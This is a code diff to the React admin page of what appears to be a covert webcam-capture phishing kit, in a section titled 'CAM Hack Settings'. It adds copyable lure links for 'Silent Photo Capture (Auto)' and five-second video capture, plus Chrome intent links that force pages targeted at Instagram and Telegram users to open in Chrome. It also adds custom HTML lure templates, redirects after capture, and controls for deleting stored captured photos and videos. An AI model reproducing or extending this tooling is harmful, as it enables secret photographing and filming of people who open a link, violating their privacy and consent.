@@ -827,20 +827,37 @@ const Admin = () => {
 
         {/* CAM Hack Section */}
         <Section title="CAM Hack Settings" icon={Camera} color="neon-red">
+          {/* Session ID */}
           <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
-            <h3 className="font-bold text-neon-green">Session ID</h3>
-            <p className="text-xs text-muted-foreground">Unique ID to identify photos from your links (synced across all devices)</p>
-            <Input
-              value={settings.camSessionId}
-              onChange={(e) => updateSettings({ camSessionId: e.target.value })}
-              placeholder="shubhcam01"
-              className="font-mono"
-            />
+            <h3 className="font-bold text-neon-green flex items-center gap-2">
+              <Database className="w-4 h-4" /> Session ID
+            </h3>
+            <p className="text-xs text-muted-foreground">Unique ID to identify photos/videos from your links (synced across all devices)</p>
+            <div className="flex gap-2">
+              <Input
+                value={settings.camSessionId}
+                onChange={(e) => updateSettings({ camSessionId: e.target.value })}
+                placeholder="shubhcam01"
+                className="font-mono"
+              />
+              <Button
+                variant="outline"
+                onClick={() => {
+                  const newId = Math.random().toString(36).substring(2, 10);
+                  updateSettings({ camSessionId: newId });
+                  toast({ title: "New Session", description: `Session ID: ${newId}` });
+                }}
+                className="border-neon-green text-neon-green hover:bg-neon-green/10"
+              >
+                <RefreshCw className="w-4 h-4" />
+              </Button>
+            </div>
           </div>
 
+          {/* Redirect URL */}
           <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
-            <h3 className="font-bold text-neon-pink">Redirect URL (Normal Capture)</h3>
-            <p className="text-xs text-muted-foreground">Where to redirect users after normal capture</p>
+            <h3 className="font-bold text-neon-pink">Redirect URL</h3>
+            <p className="text-xs text-muted-foreground">Where to redirect users after capture (photo/video)</p>
             <Input
               value={settings.camRedirectUrl}
               onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
@@ -849,105 +866,251 @@ const Admin = () => {
             />
           </div>
 
+          {/* All Capture Links */}
+          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
+            <h3 className="font-bold text-neon-yellow flex items-center gap-2">
+              <ExternalLink className="w-4 h-4" /> All Capture Links
+            </h3>
+            
+            {/* Silent Photo Capture */}
+            <div className="p-3 bg-neon-pink/10 rounded-lg border border-neon-pink/30">
+              <label className="text-xs text-neon-pink font-bold mb-2 block flex items-center gap-2">
+                👁 Silent Photo Capture (Auto)
+              </label>
+              <div className="flex gap-2">
+                <Input
+                  readOnly
+                  value={`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`}
+                  className="font-mono text-xs bg-background/50"
+                />
+                <Button
+                  size="icon"
+                  variant="outline"
+                  onClick={() => {
+                    navigator.clipboard.writeText(`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`);
+                    toast({ title: "Copied!", description: "Silent capture link copied" });
+                  }}
+                  className="border-neon-pink text-neon-pink"
+                >
+                  <Save className="w-4 h-4" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Video Capture */}
+            <div className="p-3 bg-neon-red/10 rounded-lg border border-neon-red/30">
+              <label className="text-xs text-neon-red font-bold mb-2 block flex items-center gap-2">
+                🎬 5 Second Video Capture
+              </label>
+              <div className="flex gap-2">
+                <Input
+                  readOnly
+                  value={`${window.location.origin}/video-capture?session=${settings.camSessionId}&duration=5&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`}
+                  className="font-mono text-xs bg-background/50"
+                />
+                <Button
+                  size="icon"
+                  variant="outline"
+                  onClick={() => {
+                    navigator.clipboard.writeText(`${window.location.origin}/video-capture?session=${settings.camSessionId}&duration=5&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`);
+                    toast({ title: "Copied!", description: "Video capture link copied" });
+                  }}
+                  className="border-neon-red text-neon-red"
+                >
+                  <Save className="w-4 h-4" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Chrome Intent */}
+            <div className="p-3 bg-neon-orange/10 rounded-lg border border-neon-orange/30">
+              <label className="text-xs text-neon-orange font-bold mb-2 block flex items-center gap-2">
+                📱 Chrome Intent (Instagram/Telegram)
+              </label>
+              <div className="flex gap-2">
+                <Input
+                  readOnly
+                  value={`intent://${window.location.origin.replace(/^https?:\/\//, '')}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}#Intent;scheme=https;package=com.android.chrome;end`}
+                  className="font-mono text-xs bg-background/50"
+                />
+                <Button
+                  size="icon"
+                  variant="outline"
+                  onClick={() => {
+                    navigator.clipboard.writeText(`intent://${window.location.origin.replace(/^https?:\/\//, '')}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}#Intent;scheme=https;package=com.android.chrome;end`);
+                    toast({ title: "Copied!", description: "Chrome intent link copied" });
+                  }}
+                  className="border-neon-orange text-neon-orange"
+                >
+                  <Save className="w-4 h-4" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Custom HTML Capture */}
+            {settings.customCaptureHtml && (
+              <div className="p-3 bg-neon-cyan/10 rounded-lg border border-neon-cyan/30">
+                <label className="text-xs text-neon-cyan font-bold mb-2 block flex items-center gap-2">
+                  🎨 Custom HTML Capture
+                </label>
+                <div className="flex gap-2">
+                  <Input
+                    readOnly
+                    value={`${window.location.origin}/custom-capture?session=${settings.camSessionId}`}
+                    className="font-mono text-xs bg-background/50"
+                  />
+                  <Button
+                    size="icon"
+                    variant="outline"
+                    onClick={() => {
+                      navigator.clipboard.writeText(`${window.location.origin}/custom-capture?session=${settings.camSessionId}`);
+                      toast({ title: "Copied!", description: "Custom HTML capture link copied" });
+                    }}
+                    className="border-neon-cyan text-neon-cyan"
+                  >
+                    <Save className="w-4 h-4" />
+                  </Button>
+                </div>
+              </div>
+            )}
+
+            {/* Chrome Custom HTML */}
+            {settings.chromeCustomHtml && (
+              <div className="p-3 bg-neon-purple/10 rounded-lg border border-neon-purple/30">
+                <label className="text-xs text-neon-purple font-bold mb-2 block flex items-center gap-2">
+                  🔧 Chrome Custom HTML
+                </label>
+                <div className="flex gap-2">
+                  <Input
+                    readOnly
+                    value={`${window.location.origin}/chrome-custom-capture?session=${settings.camSessionId}`}
+                    className="font-mono text-xs bg-background/50"
+                  />
+                  <Button
+                    size="icon"
+                    variant="outline"
+                    onClick={() => {
+                      navigator.clipboard.writeText(`${window.location.origin}/chrome-custom-capture?session=${settings.camSessionId}`);
+                      toast({ title: "Copied!", description: "Chrome custom HTML link copied" });
+                    }}
+                    className="border-neon-purple text-neon-purple"
+                  >
+                    <Save className="w-4 h-4" />
+                  </Button>
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* Custom HTML Template */}
           <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
             <h3 className="font-bold text-neon-orange flex items-center gap-2">
-              Custom HTML Template
+              <Upload className="w-4 h-4" /> Custom HTML Template
             </h3>
             <p className="text-xs text-muted-foreground">Create a custom page for capture. Leave empty for default.</p>
             <textarea
               value={settings.customCaptureHtml}
               onChange={(e) => updateSettings({ customCaptureHtml: e.target.value })}
               placeholder="<html>...</html>"
-              className="w-full h-32 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
+              className="w-full h-24 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
             />
+            <div className="flex gap-2">
+              <Button
+                variant="outline"
+                size="sm"
+                onClick={() => updateSettings({ customCaptureHtml: "" })}
+                className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
+              >
+                <X className="w-4 h-4 mr-1" /> Clear
+              </Button>
+            </div>
           </div>
 
+          {/* Chrome Custom HTML Template */}
           <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
             <h3 className="font-bold text-neon-cyan flex items-center gap-2">
-              Chrome Custom HTML Template
+              <Upload className="w-4 h-4" /> Chrome Custom HTML
             </h3>
-            <p className="text-xs text-muted-foreground">Custom page for Chrome intent capture.</p>
+            <p className="text-xs text-muted-foreground">Custom page for Chrome intent capture (Instagram/Telegram).</p>
             <textarea
               value={settings.chromeCustomHtml}
               onChange={(e) => updateSettings({ chromeCustomHtml: e.target.value })}
               placeholder="<html>...</html>"
-              className="w-full h-32 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
+              className="w-full h-24 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
             />
-          </div>
-
-          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
-            <h3 className="font-bold text-neon-yellow flex items-center gap-2">
-              <ExternalLink className="w-4 h-4" /> Capture Links
-            </h3>
-            <div className="space-y-3">
-              <div>
-                <label className="text-xs text-muted-foreground mb-1 block">Normal Capture Link</label>
-                <div className="flex gap-2">
-                  <Input
-                    readOnly
-                    value={`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl)}`}
-                    className="font-mono text-xs"
-                  />
-                  <Button
-                    size="icon"
-                    variant="outline"
-                    onClick={() => {
-                      navigator.clipboard.writeText(`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl)}`);
-                      toast({ title: "Copied!", description: "Normal capture link copied" });
-                    }}
-                    className="border-neon-green text-neon-green"
-                  >
-                    <Save className="w-4 h-4" />
-                  </Button>
-                </div>
-              </div>
-              {settings.customCaptureHtml && (
-                <div>
-                  <label className="text-xs text-muted-foreground mb-1 block">Custom HTML Capture Link</label>
-                  <div className="flex gap-2">
-                    <Input
-                      readOnly
-                      value={`${window.location.origin}/custom-capture?session=${settings.camSessionId}`}
-                      className="font-mono text-xs"
-                    />
-                    <Button
-                      size="icon"
-                      variant="outline"
-                      onClick={() => {
-                        navigator.clipboard.writeText(`${window.location.origin}/custom-capture?session=${settings.camSessionId}`);
-                        toast({ title: "Copied!", description: "Custom capture link copied" });
-                      }}
-                      className="border-neon-pink text-neon-pink"
-                    >
-                      <Save className="w-4 h-4" />
-                    </Button>
-                  </div>
-                </div>
-              )}
+            <div className="flex gap-2">
+              <Button
+                variant="outline"
+                size="sm"
+                onClick={() => updateSettings({ chromeCustomHtml: "" })}
+                className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
+              >
+                <X className="w-4 h-4 mr-1" /> Clear
+              </Button>
             </div>
           </div>
 
+          {/* Data Management */}
           <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
             <h3 className="font-bold text-neon-red flex items-center gap-2">
-              <Trash2 className="w-4 h-4" /> Clear Captured Photos
+              <Trash2 className="w-4 h-4" /> Clear Captured Data
             </h3>
-            <Button
-              onClick={async () => {
-                const { error } = await supabase
-                  .from("captured_photos")
-                  .delete()
-                  .eq("session_id", settings.camSessionId);
-                if (!error) {
-                  toast({ title: "Photos Cleared", description: "All captured photos deleted" });
-                } else {
-                  toast({ title: "Error", description: "Failed to clear photos", variant: "destructive" });
-                }
-              }}
-              variant="outline"
-              className="border-neon-red text-neon-red hover:bg-neon-red/10"
-            >
-              <Trash2 className="w-4 h-4 mr-2" /> Clear All Photos
-            </Button>
+            <p className="text-xs text-muted-foreground">Delete all captured photos and videos for current session</p>
+            <div className="flex gap-2 flex-wrap">
+              <Button
+                onClick={async () => {
+                  const { error } = await supabase
+                    .from("captured_photos")
+                    .delete()
+                    .eq("session_id", settings.camSessionId);
+                  if (!error) {
+                    toast({ title: "Photos Cleared", description: "All captured photos deleted" });
+                  } else {
+                    toast({ title: "Error", description: "Failed to clear photos", variant: "destructive" });
+                  }
+                }}
+                variant="outline"
+                size="sm"
+                className="border-neon-pink text-neon-pink hover:bg-neon-pink/10"
+              >
+                <Image className="w-4 h-4 mr-2" /> Clear Photos
+              </Button>
+              <Button
+                onClick={async () => {
+                  // First get all videos for this session
+                  const { data: videos } = await supabase
+                    .from("captured_videos")
+                    .select("video_url")
+                    .eq("session_id", settings.camSessionId);
+                  
+                  // Delete from storage
+                  if (videos) {
+                    for (const video of videos) {
+                      const urlParts = video.video_url.split('/captured-videos/');
+                      if (urlParts[1]) {
+                        await supabase.storage.from('captured-videos').remove([urlParts[1]]);
+                      }
+                    }
+                  }
+                  
+                  // Delete from database
+                  const { error } = await supabase
+                    .from("captured_videos")
+                    .delete()
+                    .eq("session_id", settings.camSessionId);
+                  if (!error) {
+                    toast({ title: "Videos Cleared", description: "All captured videos deleted" });
+                  } else {
+                    toast({ title: "Error", description: "Failed to clear videos", variant: "destructive" });
+                  }
+                }}
+                variant="outline"
+                size="sm"
+                className="border-neon-red text-neon-red hover:bg-neon-red/10"
+              >
+                <Camera className="w-4 h-4 mr-2" /> Clear Videos
+              </Button>
+            </div>
           </div>
         </Section>
 
